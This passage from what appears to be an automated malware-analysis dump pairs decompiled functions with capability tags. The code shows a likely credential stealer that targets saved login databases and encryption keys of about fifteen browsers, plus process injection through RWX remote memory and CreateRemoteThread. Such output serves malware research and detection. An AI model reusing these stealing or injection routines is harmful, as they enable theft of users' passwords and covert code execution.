        "decompiled_code": "\nuint __cdecl fcn.004053f2(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    uchar auStack32 [28];\n    \n    uStack56 = 7;\n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401c0a(auStack32, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(auStack48 + 4, arg_ch);\n            fcn.00404767(*(iVar1 + 0x10));\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(&uStack56, arg_ch);\n            fcn.00404740(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00406f1d();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 337
    },
    "004054e1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004054e1(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 5;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401a81(auStack56, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.00406f1d();\n            iVar1 = fcn.00401a81(auStack56, arg_ch);\n            fcn.00404767(*(iVar1 + 4));\n            fcn.00406f1d();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 278
    },
    "0040587e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040587e(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack60 [4];\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    \n    uStack56 = 0x1b;\n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    fcn.00404788(in_ECX + 4);\n    fcn.00404767(*(in_ECX + 8));\n    fcn.0040468e(*(in_ECX + 0xc));\n    fcn.00404788(in_ECX + 0x10);\n    if (*(in_ECX + 0x1c) != 0) {\n        do {\n            arg_8h_00 = fcn.00401c0a(auStack48, arg_ch);\n            fcn.00404788(arg_8h_00);\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(auStack60, arg_ch);\n            fcn.00404767(*(iVar1 + 0x10));\n            fcn.00406f1d();\n            iVar1 = fcn.00401c0a(&stack0xffffffb8, arg_ch);\n            fcn.00404740(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00406f1d();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0x1c));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 405
    },
    "00407c27": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c27(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EDX;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar2 = *(in_EDX + 4);\n    fcn.00407458();\n    puVar4 = *(in_EDX + 0xc);\n    piVar6 = *(arg_8h + 0xc);\n    do {\n        uVar3 = *puVar4 - *piVar6;\n        piVar6 = piVar6 + 1;\n        uVar1 = *puVar4;\n        *puVar4 = uVar3 - uVar5;\n        puVar4 = puVar4 + 1;\n        uVar5 = uVar1 < uVar3 || uVar3 < uVar3 - uVar5;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    if (arg_ch != NULL) {\n        *arg_ch = uVar5;\n    }\n    fcn.0040735b();\n    fcn.00407d69();\n    fcn.0040735b();\n    return;\n}\n",
        "token_count": 323
    },
    "00409554": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409554(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t uVar1;\n    uint var_5ch;\n    \n    fcn.0040844f();\n    uVar1 = 0;\n    if (arg_8h != 0) {\n        do {\n            fcn.004083af(1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_8h);\n    }\n    fcn.00408316();\n    *(in_ECX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 139
    },
    "0040ec28": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ec28(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uchar *arg_8h_00;\n    uint uVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack60;\n    uchar auStack52 [48];\n    \n    *0x41e7b4 = arg_8h;\n    iStack88 = 0x40ec50;\n    fcn.0041780e(&stack0xffffffcc, arg_8h[2], 0);\n    if (iStack60 != 0) {\n        puVar3 = &stack0xffffffc0;\n        iStack92 = extraout_ECX;\n        iStack88 = extraout_ECX;\n        fcn.00404094(puVar3);\n        fcn.0040c44e(puVar3);\n        iVar1 = fcn.0040c475();\n        if ((iVar1 != 0) && (*0x41e8bc != 0)) {\n            if ((*0x41e7b4)[3] == 0) {\n                fcn.00413915();\n                fcn.00413915();\n                fcn.004100de();\n                fcn.0040fb4b(L\"\\\\Google\\\\Chrome Beta\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\Google\\\\Chrome Beta\\\\User Data\\\\Local State\", 0, 0, 1);\n                fcn.0040fb4b(L\"\\\\Epic Privacy Browser\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\Epic Privacy Browser\\\\User Data\\\\Local State\", 0, 0, 6);\n                fcn.0040fb4b(L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State\", 0, 0, 7);\n                fcn.0040fb4b(L\"\\\\UCBrowser\\\\User Data_i18n\\\\Default\\\\UC Login Data.17\", \n                             L\"\\\\UCBrowser\\\\User Data_i18n\\\\Local State\", 0, 1, 8);\n                fcn.0040fb4b(L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\Tencent\\\\QQBrowser\\\\User Data\\\\Local State\", 0, 0, 9);\n                fcn.0040fb4b(L\"\\\\Opera Software\\\\Opera Stable\\\\Login Data\", \n                             L\"\\\\Opera Software\\\\Opera Stable\\\\Local State\", 1, 0, 10);\n                fcn.0040fb4b(L\"\\\\Blisk\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Blisk\\\\User Data\\\\Local State\", 0, 0, 0xb);\n                fcn.0040fb4b(L\"\\\\Chromium\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Chromium\\\\User Data\\\\Local State\", 0, 0\n                             , 0xc);\n                fcn.0040fb4b(L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Local State\", 0, 0, 0xd);\n                fcn.0040fb4b(L\"\\\\Vivaldi\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Vivaldi\\\\User Data\\\\Local State\", 0, 0, \n                             0xe);\n                fcn.0040fb4b(L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Default\\\\Login Data\", \n                             L\"\\\\Comodo\\\\Dragon\\\\User Data\\\\Local State\", 0, 0, 0xf);\n                fcn.0040fb4b(L\"\\\\Torch\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Torch\\\\User Data\\\\Local State\", 0, 0, 0x10)\n                ;\n                fcn.0040fb4b(L\"\\\\Slimjet\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Slimjet\\\\User Data\\\\Local State\", 0, 0, \n                             0x11);\n                fcn.0040fb4b(L\"\\\\CentBrowser\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\CentBrowser\\\\User Data\\\\Local State\"\n                             , 0, 0, 0x12);\n                fcn.0040db12();\n                fcn.0040c73a();\n                puVar3 = &stack0xfffffe80;\n                uVar4 = extraout_ECX_00;\n                fcn.00404656(puVar3);\n                fcn.0040cd01(puVar3);\n                arg_8h_00 = &stack0xfffffe7c;\n                uVar2 = extraout_ECX_01;\n                fcn.00404656(arg_8h_00);\n                fcn.0040d379(arg_8h_00);\n                fcn.0040c40c(arg_8h_00, uVar2, puVar3, uVar4);\n                fcn.00402917(**0x41e7b4);\n                fcn.00402917(&stack0xfffffe7c);\n                fcn.00405f32(&stack0xfffffe88);\n                fcn.0040295e();\n                fcn.0040295e();\n                if (*(**0x41e7b4 + 0x20) != 0) {\n                    fcn.00406f1d();\n                }\n                fcn.00406f1d();\n                fcn.00406f1d();\n            }\n            else {\n                fcn.0040f480();\n                iStack88 = 0x419480;\n                fcn.00405f32(&stack0xffffffa8);\n                iStack92 = 0x419480;\n                fcn.0040eff2();\n                iStack88 = *0x41e6a8;\n                iStack92 = 0x419480;\n                fcn.00405f32(&stack0xffffffa4);\n                if (*0x41e6a8 != 0) {\n                    fcn.00401c4b();\n                }\n            }\n        }\n        fcn.00406f66();\n        fcn.00402771();\n    }\n    fcn.00404081();\n    return 0;\n}\n",
        "token_count": 1442
    },
    "004135d1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004135f1)\n\nuint fcn.004135d1(void)\n\n{\n    uint *lpString2;\n    int32_t iVar1;\n    uint *puVar2;\n    code **ppcVar3;\n    uint *puVar4;\n    uint var_5ch;\n    code *apcStack92 [3];\n    uint var_4ch;\n    uint var_3ch;\n    code *var_1ch;\n    code *pcStack28;\n    code *pcStack24;\n    code *pcStack20;\n    uint var_ch;\n    code *var_8h;\n    code *var_4h;\n    \n    var_4h = 0x80000000;\n    ppcVar3 = cpuid(0x80000000);\n    var_8h = *ppcVar3;\n    pcStack28 = ppcVar3[1];\n    pcStack20 = ppcVar3[2];\n    pcStack24 = ppcVar3[3];\n    var_1ch = var_8h;\n    if (0x7fffffff < var_8h) {\n        do {\n            if (var_4h == NULL) {\n                ppcVar3 = cpuid_basic_info(0);\n            }\n            else if (var_4h == 0x1) {\n                ppcVar3 = cpuid_Version_info(1);\n            }\n            else if (var_4h == 0x2) {\n                ppcVar3 = cpuid_cache_tlb_info(2);\n            }\n            else if (var_4h == 0x3) {\n                ppcVar3 = cpuid_serial_info(3);\n            }\n            else if (var_4h == 0x4) {\n                ppcVar3 = cpuid_Deterministic_Cache_Parameters_info(4);\n            }\n            else if (var_4h == 0x5) {\n                ppcVar3 = cpuid_MONITOR_MWAIT_Features_info(5);\n            }\n            else if (var_4h == 0x6) {\n                ppcVar3 = cpuid_Thermal_Power_Management_info(6);\n            }\n            else if (var_4h == 0x7) {\n                ppcVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n            }\n            else if (var_4h == 0x9) {\n                ppcVar3 = cpuid_Direct_Cache_Access_info(9);\n            }\n            else if (var_4h == 0xa) {\n                ppcVar3 = cpuid_Architectural_Performance_Monitoring_info(10);\n            }\n            else if (var_4h == 0xb) {\n                ppcVar3 = cpuid_Extended_Topology_info(0xb);\n            }\n            else if (var_4h == 0xd) {\n                ppcVar3 = cpuid_Processor_Extended_States_info(0xd);\n            }\n            else if (var_4h == 0xf) {\n                ppcVar3 = cpuid_Quality_of_Service_info(0xf);\n            }\n            else if (var_4h == 0x80000002) {\n                ppcVar3 = cpuid_brand_part1_info(0x80000002);\n            }\n            else if (var_4h == 0x80000003) {\n                ppcVar3 = cpuid_brand_part2_info(0x80000003);\n            }\n            else if (var_4h == reloc.WS2_32.dll_connect) {\n                ppcVar3 = cpuid_brand_part3_info(0x80000004);\n            }\n            else {\n                ppcVar3 = cpuid(var_4h);\n            }\n            var_1ch = *ppcVar3;\n            pcStack28 = ppcVar3[1];\n            pcStack20 = ppcVar3[2];\n            pcStack24 = ppcVar3[3];\n            if (var_4h == 0x80000002) {\n                ppcVar3 = &var_5ch;\ncode_r0x00413651:\n                *ppcVar3 = var_1ch;\n                ppcVar3[1] = pcStack28;\n                ppcVar3[2] = pcStack24;\n                ppcVar3[3] = pcStack20;\n            }\n            else {\n                if (var_4h == 0x80000003) {\n                    ppcVar3 = &var_4ch;\n                    goto code_r0x00413651;\n                }\n                if (var_4h == reloc.WS2_32.dll_connect) {\n                    ppcVar3 = &var_3ch;\n                    goto code_r0x00413651;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h <= var_8h);\n    }\n    lpString2 = fcn.00401000(0x200);\n    puVar2 = &var_5ch;\n    puVar4 = lpString2;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040434f(lpString2);\n    fcn.004040d5(var_ch);\n    fcn.00406f1d();\n    fcn.00401014(lpString2);\n    return var_ch;\n}\n",
        "token_count": 1220
    },
    "00415532": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00415532(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h = 0;\n    if (*in_ECX == 0) {\n        *arg_8h = 0;\n        fcn.00406f1d();\n    }\n    else {\n        iVar1 = fcn.00414d78(arg_ch, &var_ch);\n        iVar3 = 0;\n        if (iVar1 != 0) {\n            uVar2 = fcn.00403f05(&arg_ch);\n            fcn.004043c7(uVar2);\n            fcn.00406f1d();\n            iVar3 = var_4h;\n        }\n        *arg_8h = 0;\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3);\n            uVar2 = fcn.00406f2c();\n            *arg_8h = uVar2;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar2, iVar3);\n        }\n        fcn.00406f1d();\n        if (var_ch != 0) {\n            fcn.00406f66();\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 345
    },
    "0040238e": {
        "rules": [
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040238e(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00404094(arg_8h + 2);\n    fcn.00404656(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    fcn.00404656(arg_8h + 6);\n    in_ECX[7] = arg_8h[7];\n    in_ECX[8] = arg_8h[8];\n    fcn.00404656(arg_8h + 9);\n    in_ECX[10] = arg_8h[10];\n    fcn.00404656(arg_8h + 0xb);\n    fcn.00404656(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    fcn.00404656(arg_8h + 0xe);\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    in_ECX[0x12] = arg_8h[0x12];\n    in_ECX[0x13] = arg_8h[0x13];\n    fcn.00404094(arg_8h + 0x14);\n    return in_ECX;\n}\n",
        "token_count": 364
    },
    "00402cac": {
        "rules": [
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cac(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = *arg_8h;\n    in_ECX[1] = arg_8h[1];\n    fcn.00403eca(arg_8h + 2);\n    fcn.004043c7(arg_8h + 4);\n    in_ECX[5] = arg_8h[5];\n    fcn.004043c7(arg_8h + 6);\n    in_ECX[7] = arg_8h[7];\n    in_ECX[8] = arg_8h[8];\n    fcn.004043c7(arg_8h + 9);\n    in_ECX[10] = arg_8h[10];\n    fcn.004043c7(arg_8h + 0xb);\n    fcn.004043c7(arg_8h + 0xc);\n    in_ECX[0xd] = arg_8h[0xd];\n    fcn.004043c7(arg_8h + 0xe);\n    in_ECX[0xf] = arg_8h[0xf];\n    in_ECX[0x10] = arg_8h[0x10];\n    in_ECX[0x11] = arg_8h[0x11];\n    in_ECX[0x12] = arg_8h[0x12];\n    in_ECX[0x13] = arg_8h[0x13];\n    fcn.00403eca(arg_8h + 0x14);\n    return;\n}\n",
        "token_count": 358
    },
    "00415ede": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00415ede(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    char *pcVar3;\n    uint var_4h;\n    \n    pcVar3 = arg_8h;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = 0;\n    if (0 < in_EDX) {\n        do {\n            *(iVar2 + in_ECX) = *(iVar2 + in_ECX) ^ arg_8h[iVar2 % (pcVar3 - (arg_8h + 1))];\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < in_EDX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 200
    },
    "00402746": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402746(uint lpStartAddress, uint lpParameter)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, lpStartAddress, lpParameter, 0, in_ECX + 1);\n    *in_ECX = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 92
    },
    "00413153": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00413153(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00401000(0x108);\n    if ((iVar1 == 0) || (param_1 == 0)) {\n        fcn.00401014(iVar1);\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(iVar1, param_1);\n        *(iVar1 + 0x104) = param_2;\n        (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00412bca, iVar1, 0, 0);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00415fe0": {
        "rules": [
            "create thread",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415fe0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_10ch;\n    uint var_108h;\n    uint lpflOldProtect;\n    uint hProcess;\n    \n    uVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, param_2);\n    hProcess = uVar4;\n    var_10ch = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    pcVar5 = fcn.00401000(0xff);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, pcVar5, 0xff);\n    pcVar3 = _sym.imp.KERNEL32.dll_VirtualAllocEx;\n    iVar6 = &var_108h - pcVar5;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5[iVar6] = cVar1;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar4, 0, 0x800, 0x3000, 0x40);\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteProcessMemory;\n    (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar4, iVar6, 0x41e158, 0x800, 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(hProcess, iVar6, 0x800, 0x40, &lpflOldProtect);\n    uVar4 = (*pcVar3)(hProcess, 0, 0x103, 0x3000, 4);\n    (*pcVar2)(hProcess, uVar4, &var_10ch, 0x103, 0);\n    *0x551bfc = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(hProcess, 0, 0, iVar6 + 0x10e, uVar4, 0, 0);\n    return;\n}\n",
        "token_count": 499
    },
    "004027c6": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027c6(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    fcn.004043c7(arg_8h);\n    fcn.004043c7(arg_8h + 4);\n    fcn.004043c7(arg_8h + 8);\n    fcn.004043c7(arg_8h + 0xc);\n    uVar1 = *(arg_8h + 0x14);\n    *(in_ECX + 0x10) = *(arg_8h + 0x10);\n    *(in_ECX + 0x14) = uVar1;\n    *(in_ECX + 0x18) = *(arg_8h + 0x18);\n    *(in_ECX + 0x1c) = *(arg_8h + 0x1c);\n    *(in_ECX + 0x20) = *(arg_8h + 0x20);\n    return;\n}\n",
        "token_count": 227
    },
    "00404c2d": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c2d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[1] = 0;\n    in_ECX[4] = 0;\n    *in_ECX = 0x4197e4;\n    in_ECX[5] = 5;\n    in_ECX[3] = 5;\n    fcn.00401bbd();\n    fcn.004043c7(&arg_ch);\n    fcn.00401fd0(&arg_10h);\n    in_ECX[6] = arg_8h;\n    fcn.00406f1d();\n    arg_ch = 0;\n    fcn.00401586();\n    return;\n}\n",
        "token_count": 172
    },
    "004050e1": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004050e1(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00404767(*(in_ECX + 4));\n    fcn.00404788(in_ECX + 8);\n    fcn.00404767(*(in_ECX + 0xc));\n    fcn.00404767(*(in_ECX + 0x10));\n    fcn.00404767(*(in_ECX + 0x14));\n    fcn.00404767(*(in_ECX + 0x18));\n    fcn.004046a9(*(in_ECX + 0x1c));\n    fcn.00404767(*(in_ECX + 0x20));\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 209
    },
    "00405168": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00405168(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[1] = arg_8h;\n    *in_ECX = 0x419874;\n    fcn.00404656(&arg_ch);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    in_ECX[7] = arg_20h;\n    in_ECX[8] = arg_24h;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 195
    },
    "004051d1": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004051d1(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.004046a9(in_ECX + 4);\n    fcn.00404767(*(in_ECX + 0xc));\n    fcn.00404767(*(in_ECX + 0x10));\n    fcn.00404767(*(in_ECX + 0x14));\n    fcn.00404767(*(in_ECX + 0x18));\n    fcn.00404788(in_ECX + 0x1c);\n    fcn.00404788(in_ECX + 0x20);\n    fcn.00404767(*(in_ECX + 0x24));\n    fcn.00404767(*(in_ECX + 0x28));\n    fcn.00404788(in_ECX + 0x2c);\n    fcn.00404788(in_ECX + 0x30);\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 259
    },
    "004052bc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004052bc(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x419884;\n    fcn.00404094(&arg_8h);\n    in_ECX[3] = arg_10h;\n    in_ECX[4] = arg_14h;\n    in_ECX[5] = arg_18h;\n    in_ECX[6] = arg_1ch;\n    fcn.00404656(&arg_20h);\n    fcn.00404656(&arg_24h);\n    in_ECX[9] = arg_28h;\n    in_ECX[10] = arg_2ch;\n    fcn.00404656(&arg_30h);\n    fcn.00404656(&arg_34h);\n    fcn.00404081();\n    fcn.00406f1d();\n    arg_20h = 0;\n    fcn.00406f1d();\n    arg_24h = 0;\n    fcn.00406f1d();\n    arg_30h = 0;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 327
    },
    "0040696e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "initialize Winsock library"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040696e(uint *param_1)\n\n{\n    *param_1 = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    fcn.00414070(param_1);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(2, param_1 + 0xe);\n    param_1[3] = 0xffffffff;\n    param_1[6] = 0;\n    param_1[9] = 0;\n    return param_1;\n}\n",
        "token_count": 151
    },
    "0040844f": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040844f(uint *param_1)\n\n{\n    param_1[6] = 0;\n    param_1[5] = 0;\n    *param_1 = 0x67452301;\n    param_1[1] = 0xefcdab89;\n    param_1[2] = 0x98badcfe;\n    param_1[3] = 0x10325476;\n    param_1[4] = 0xc3d2e1f0;\n    return;\n}\n",
        "token_count": 122
    },
    "00409ab4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409ab4(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    uint *puVar2;\n    uint extraout_ECX;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    \n    uVar3 = 0;\n    iVar4 = 5;\n    in_ECX[4] = 5;\n    in_ECX[2] = 5;\n    in_ECX[3] = 0;\n    puVar1 = fcn.00406fa7();\n    if (puVar1 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar2;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar4 = iVar4 + -1;\n            puVar1 = puVar1 + 2;\n        } while (iVar4 != 0);\n    }\n    in_ECX[1] = puVar2;\n    fcn.00413fc0();\n    in_ECX[0xb] = 0xffff;\n    fcn.004043c7(&arg_8h);\n    uVar5 = 0x80000000;\n    uVar6 = extraout_ECX;\n    iVar4 = fcn.00413f4f(0x80000000);\n    if (iVar4 != 0) {\n        in_ECX[0xc] = in_ECX[10] / 0xffff;\n        if (in_ECX[10] % 0xffff != 0) {\n            in_ECX[0xc] = in_ECX[10] / 0xffff + 1;\n        }\n        uVar3 = 1;\n    }\n    *in_ECX = uVar3;\n    fcn.00406f1d(uVar5, uVar6);\n    return;\n}\n",
        "token_count": 445
    },
    "00414e90": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
